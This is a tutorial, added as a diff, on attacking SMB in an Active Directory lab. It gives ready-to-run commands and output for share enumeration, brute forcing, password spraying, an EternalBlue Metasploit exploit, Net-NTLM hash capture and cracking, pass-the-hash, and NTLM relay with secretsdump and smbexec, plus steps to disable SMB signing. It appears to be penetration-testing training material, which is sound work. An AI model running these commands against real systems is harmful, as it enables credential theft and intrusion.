@@ -1,0 +1,498 @@
+                    _______________________________
+
+                     ACTIVE DIRECTORY EXPLOITATION
+                          Server Message Block
+
+                                Hexdump
+                    _______________________________
+
+
+Table of Contents
+_________________
+
+1. What is SMB?
+2. SMB Tools
+.. 1. smbmap
+.. 2. smbclient
+.. 3. netexec
+3. Threats Associated with SMB
+.. 1. Scenario 1 - Guest or Anonymous access to Shares
+.. 2. Scenario 2 - RCE Via access to Administrative Shares
+.. 3. Scenario 3 - SMB Brute Forcing
+.. 4. Scenario 4 - SMB Password Spraying
+.. 5. Scenario 5 - SMBv1 EternalBlue (CVE-2017-0144)
+.. 6. Scenario 6 - Net-NTLM Capture Attack
+.. 7. Scenario 7 - Pass the Hash Attack (PTH)
+.. 8. Scenario 8 - Net-NTLM Relay Attack
+4. References
+
+
+1 What is SMB?
+==============
+
+  SMB (`Server Message Block') is a network protocol that was developed
+  for file-sharing. It enables computers to share files, printers and
+  other resources over a network.
+
+
+2 SMB Tools
+===========
+
+  Different tools can be used to enumerate and exploit SMB.
+
+
+2.1 smbmap
+~~~~~~~~~~
+
+  Installation through `pip'
+  ,----
+  | $ python3 -m venv venv
+  | $ . venv/bin/activate
+  | $ pip3 install smbmap 
+  `----
+
+  ----------------------------------------------------------------------
+
+  List shares with anonymous access
+  ,----
+  | $ smbmap -H 192.168.122.30
+  `----
+
+  List shares with authentication
+  ,----
+  | $ smbmap -H 192.168.122.30 -u leo -p "Hexdump123!"
+  | $ smbmap -H 192.168.122.30 -u leo --prompt
+  `----
+
+  List files in a given share
+  ,----
+  | $ smbmap -H 192.168.122.30 -d hexdump.lab -u leo -p "Hexdump123!" -r "SharedFiles"
+  `----
+
+  ----------------------------------------------------------------------
+
+  Read OS version
+  ,----
+  | $ smbmap -H 192.168.122.30 -u leo -p "Hexdump123!" -v
+  `----
+
+  Check if signing is enabled
+  ,----
+  | $ smbmap -H 192.168.122.30 -u leo -p "Hexdump123!" --signing
+  `----
+
+
+2.2 smbclient
+~~~~~~~~~~~~~
+
+  Installation
+  ,----
+  | $ sudo pacman -S smbclient
+  `----
+
+  Enumerate shares
+  ,----
+  | $ smbclient -L //192.168.122.30 -U leo
+  | $ smbclient -L //192.168.122.30 -U "hexdump.lab/leo%Hexdump123!"
+  `----
+
+  Access share
+  ,----
+  | $ smbclient //192.168.122.30/SharedFiles -U "hexdump.lab/leo%Hexdump123!"
+  `----
+
+  From within the SMB share, you can proceed as follows
+
+  - `ls', to list files
+  - `cd', to move between directories
+  - `get', to download files
+  - `put', to upload files
+
+
+2.3 netexec
+~~~~~~~~~~~
+
+  Netexec is the successor of crackmapexec and it is a versatile tool to
+  play with network protocols.
+  - <https://github.com/Pennyw0rth/NetExec>
+  - <https://www.netexec.wiki/smb-protocol/enumeration/enumerate-hosts>
+
+  Install netexec
+  ,----
+  | $ yay -S netexec
+  `----
+
+  Basic enumeration
+  ,----
+  | $ nxc smb 192.168.122.30 -u "leo" -p "Hexdump123!" --shares
+  `----
+
+  Authenticate with user and list shares
+  ,----
+  | $ nxc smb 192.168.122.30 -u "leo" -p "Hexdump123!" --shares
+  `----
+
+
+3 Threats Associated with SMB
+=============================
+
+3.1 Scenario 1 - Guest or Anonymous access to Shares
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+  Sometimes it is possible to properly authenticate to SMB even without
+  knowing any credentials. This can be dangerous, as it could leak
+  sensitive data. It could even lead to RCE.
+
+  Try to authenticate using `guest' account
+  ,----
+  | $ nxc smb 192.168.122.30 -u "someaccountthatdoesntexist" -p "" --shares
+  `----
+
+  Try to authenticate using `null session'
+  ,----
+  | $ nxc smb 192.168.122.30 -u '' -p '' --users
+  `----
+
+  For more information:
+  - <https://sensepost.com/blog/2024/guest-vs-null-session-on-windows/>
+
+
+3.2 Scenario 2 - RCE Via access to Administrative Shares
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+  If it is possible to access administrative shares of SMB such as
+  `ADMIN$', `C$' and `IPC$', then it might be possible to obtain Remote
+  Code Execution (RCE).
+
+  ,----
+  | $ smbmap -H 192.168.122.30 -u "Administrator" -p "Password123!"
+  `----
+
+  ,----
+  | [+] IP: 192.168.122.30:445      Name: hexdump.lab               Status: ADMIN!!!   
+  |         Disk                                                    Permissions     Comment
+  |         ----                                                    -----------     -------
+  |         ADMIN$                                                  READ, WRITE     Remote Admin
+  |         C$                                                      READ, WRITE     Default share
+  |         IPC$                                                    READ ONLY       Remote IPC
+  |         NETLOGON                                                READ, WRITE     Logon server share 
+  |         SharedFiles                                             READ, WRITE
+  |         SYSVOL                                                  READ, WRITE     Logon server share 
+  `----
+
+  To execute commands using smbmap
+  ,----
+  | $ smbmap -H 192.168.122.30 -u administrator -p "Password123!" -x 'whoami'
+  `----
+
+
+3.3 Scenario 3 - SMB Brute Forcing
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+  We can use `legba' (developed by evilsocket) to bruteforce access to
+  SMB.
+  - <https://github.com/evilsocket/legba>
+
+  Get shell within legba docker
+  ,----
+  | docker run --entrypoint "/bin/bash" -v $(pwd)/wordlists:/data --network host -it evilsocket/legba:latest
+  `----
+
+  Bruteforce administrator password
+  ,----
+  | legba smb --smb-workgroup hexdump.lab --smb-share "C$" --username administrator --password ./passwords.txt --target 192.168.122.30
+  `----
+
+  Bruteforce leo password
+  ,----
+  | legba smb --smb-workgroup hexdump.lab --smb-share "SharedFiles" --username leo --password ./passwords.txt --target 192.168.122.30
+  `----
+
+
+3.4 Scenario 4 - SMB Password Spraying
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+  We can use `netexec' to perform password spraying.
+
+  The idea of `password spraying' is to use a limited set of passwords
+  to try and authenticate with a large set of accounts. This is often
+  useful because passwords are common and many times multiple users can
+  use the same password.
+
+  ,----
+  | $ nxc smb 192.168.122.30 -u "leo" -p passwords.txt
+  `----
+
+  ,----
+  | nxc smb ip.txt -u users.txt -p passwords.txt --continue-on-success
+  `----
+
+
+3.5 Scenario 5 - SMBv1 EternalBlue (CVE-2017-0144)
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+  Older systems running SMBv1 can be vulnerable to dangerous attacks,
+  such as `EternalBlue', also known as `CVE-2017-0144' or `MS-17-010'.
+
+  ----------------------------------------------------------------------
+
+  For example, you can use the following resources to play around with
+  vulnerable machines:
+
+  - TryHackMe, Blue
+    - Machine: <https://tryhackme.com/room/blue>
+    - OVA: <https://darkstar7471.com/resources.html>
+
+  - Hack The Box, Legacy
+    - <https://www.hackthebox.com/machines/legacy>
+
+  ----------------------------------------------------------------------
+
+  Enumerate vulnerable configuration
+  ,----
+  | $ nmap -p445 --script smb-vuln-ms17-010 192.168.122.163
+  `----
+
+  Setup `msfconsole'
+  ,----
+  | docker pull metasploitframework/metasploit-framework
+  | docker run --name sploit --rm -dit --network "host" metasploitframework/metasploit-framework
+  | docker exec -it sploit bash
+  `----
+
+  Start metasploit
+  ,----
+  | ./msfconsole
+  `----
+
+  Scan for vulnerabilty
+  ,----
+  | use auxiliary/scanner/smb/smb_ms17_010
+  | set RHOSTS 192.168.122.163
+  | run
+  `----
+
+  Exploit vulnerability
+  ,----
+  | use exploit/windows/smb/ms17_010_eternalblue
+  | set RHOSTS 192.168.122.163
+  | run
+  `----
+
+
+3.6 Scenario 6 - Net-NTLM Capture Attack
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+  When a windows client authenticates to an SMB server, the NTLM hash of
+  the client is sent the server for authentication purposes. Depending
+  on the protocol used, the hash is sent in different ways:
+  - <https://medium.com/@petergombos/lm-ntlm-net-ntlmv2-oh-my-a9b235c58ed4>
+
+  - `Net-NTLMv1'
+  ,----
+  | C = 8-byte server challenge, random
+  | K1 | K2 | K3 = LM/NT-hash | 5-bytes-0
+  | response = DES(K1,C) | DES(K2,C) | DES(K3,C)
+  `----
+
+  - `Net-NTLMv2'
+    ,----
+    | SC = 8-byte server challenge, random
+    | CC = 8-byte client challenge, random
+    | CC* = (X, time, CC2, domain name)
+    | v2-Hash = HMAC-MD5(NT-Hash, user name, domain name)
+    | LMv2 = HMAC-MD5(v2-Hash, SC, CC)
+    | NTv2 = HMAC-MD5(v2-Hash, SC, CC*)
+    | response = LMv2 | CC | NTv2 | CC*
+    `----
+
+  It is possible to obtain the Net-NTLM hash of a user by forcing a
+  client to authenticate with a fake SMB server. Possible scenarios:
+
+  - Phishing to real users
+  - After a Reverse shell
+
+  To setup the responder we proceed as follows:
+
+  Install `responder'
+  ,----
+  | $ python3 -m venv venv
+  | $ . venv/bin/activate
+  | 
+  | $ pip3 install impacket
+  | $ pip3 install netifaces
+  | 
+  | $ git clone https://github.com/lgandx/Responder.git
+  `----
+
+  Start responder on the network interface shared with the victim
+  ,----
+  | $ cd Responder
+  | $ sudo python3 Responder.py -I virbr0
+  `----
+
+  From the victim machine, connect back to the linux host
+  ,----
+  | C:\Users\Quickemu\Downloads> dir \\192.168.122.1\test
+  | Access is denied.
+  `----
+
+  This will leak the Net-NTLM hash of the user to the service.
+
+  ,----
+  | [SMB] NTLMv2-SSP Client   : 192.168.122.30
+  | [SMB] NTLMv2-SSP Username : HEXDUMP\Administrator
+  | [SMB] NTLMv2-SSP Hash     : Administrator::HEXDUMP:c24295046125d0d6:1021DC49AC19464CECB3C958A0B3855C:010100000000000080B9AEBE7376DB0129CCF056E43D77A8000000000200080057004E004200530001001E00570049004E002D00320032004400490039004A005700320035003000490004003400570049004E002D00320032004400490039004A00570032003500300049002E0057004E00420053002E004C004F00430041004C000300140057004E00420053002E004C004F00430041004C000500140057004E00420053002E004C004F00430041004C000700080080B9AEBE7376DB01060004000200000008003000300000000000000000000000003000003C18701EFC613B10789847040B3326511ABB123E6E208C0BB6CDA78E3E2DAFE00A001000000000000000000000000000000000000900240063006900660073002F003100390032002E003100360038002E003100320032002E0031000000000000000000
+  `----
+
+  It is then possible to crack such hash.
+
+  ,----
+  | # For Net-NTLMv1
+  | john --format=netntlm --wordlist=rockyou.txt hash.txt
+  | hashcat -m 5500 -a 3 hash.txt
+  | 
+  | # For Net-NTLMv2
+  | john --format=netntlmv2 --wordlist=rockyou.txt hash.txt
+  | hashcat -m 5600 -a 3 hash.txt
+  `----
+
+  This is also discussed in:
+  - [Windows Privesc 13 - Windows Hashes]
+
+
+[Windows Privesc 13 - Windows Hashes]
+<https://www.youtube.com/watch?v=UrcMs4FMcpA>
+
+
+3.7 Scenario 7 - Pass the Hash Attack (PTH)
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+  Let's say that we have managed to obtain the NTLM hashes of one of our
+  users. It is possible to give such hash to SMB in order to
+  authenticate as the user via a so-caleld `pass-the-hash' attack.
+
+  Consider for the example the following NTLM hash
+  ,----
+  | administrator:2B576ACBE6BCFDA7294D6BD18041B8FE
+  `----
+
+  We can perform a pass the hash attack with `netexec' as follows
+  ,----
+  | $ nxc smb 192.168.122.30 -u administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE
+  | $ nxc smb 192.168.122.30 -u administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE --shares
+  | $ nxc smb 192.168.122.30 -u administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE -X "whoami"
+  `----
+
+  We can spray the NTLM hash to understand to which user it belongs to.
+  ,----
+  | $ nxc smb 192.168.122.30 -u users.txt -H 2B576ACBE6BCFDA7294D6BD18041B8FE
+  `----
+
+
+3.8 Scenario 8 - Net-NTLM Relay Attack
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+  If it is not possible to crack the hash, then we can `relay' it.  This
+  can be done if the SMB server does not require signing.
+
+  ----------------------------------------------------------------------
+
+  Check if signing is enabled
+  ,----
+  | Get-SmbServerConfiguration | Select EnableSMB1Protocol, EnableSMB2Protocol, RequireSecuritySignature
+  `----
+
+  Disable signing from GPO
+  ,----
+  | gpedit.msc
+  | 
+  | Computer -> Configuration\Windows
+  |          -> Settings\Security
+  |          -> Settings\Local
+  |          -> Policies\Security
+  |          -> Options
+  `----
+
+  Disable signing from powershell
+  ,----
+  | Set-SmbClientConfiguration -RequireSecuritySignature $false
+  | Set-SmbServerConfiguration -RequireSecuritySignature $false
+  `----
+
+  ----------------------------------------------------------------------
+
+  The relay attack works as follows:
+
+  1. `Interception of Authentication Attempt'
+
+     The victim is lured into authenticating to a malicious SMB server.
+     Can be done via phishing, LLMNR/NBNS spoofing, or tricking a user
+     into accessing a file share.
+
+  2. `Capture of Net-NTLM Challenge-Response'
+
+     The malicious SMB server captures the Net-NTLM challenge-response.
+
+  3. `Relay to Target SMB'
+
+     Instead of cracking the Net-NTLM hash, the malicious server relays
+     it in real-time to another server (the target), to authenticate the
+     victim.
+
+  4. `Obtain Unauthorized Access'
+
+  ----------------------------------------------------------------------
+
+  Execution steps
+
+  Obtain list of SMB servers that do not enforce signing and that can
+  therefore be relayed.
+  ,----
+  | $ nxc smb 192.168.122.30 --gen-relay-list out.txt
+  `----
+
+  Start server to replay Net-NTLM hash
+  ,----
+  | $ sudo ntlmrelayx.py --no-http-server -smb2support -t smb://192.168.122.30 -socks
+  `----
+
+  Within the windows machine, force the victim to execute
+  ,----
+  | $ dir \\192.168.122.1\test
+  `----
+
+  At this point we have established an authenticated SOCKS proxy
+
+  ,----
+  | ntlmrelayx> socks
+  | Protocol  Target          Username               AdminStatus  Port 
+  | --------  --------------  ---------------------  -----------  ----
+  | SMB       192.168.122.30  HEXDUMP/ADMINISTRATOR  TRUE         445  
+  `----
+
+  We can use `proxychains' to proxy our commands using the authenticated
+  session
+
+  - `lookupsid.py'
+  ,----
+  | $ proxychains lookupsid.py -no-pass -domain-sids hexdump/administrator@192.168.122.30
+  `----
+
+  - `secretsdump.py'
+    ,----
+    | $ proxychains secretsdump.py -no-pass hexdump/administrator@192.168.122.30
+    `----
+
+  - `smbexec.py'
+    ,----
+    | $ proxychains smbexec.py -no-pass hexdump/administrator@192.168.122.30
+    `----
+
+
+4 References
+============
+
+  - <https://sensepost.com/blog/2024/guest-vs-null-session-on-windows/>
+  - <https://medium.com/@petergombos/lm-ntlm-net-ntlmv2-oh-my-a9b235c58ed4>
+  - <https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-signing?tabs=group-policy#disable-smb-signing>
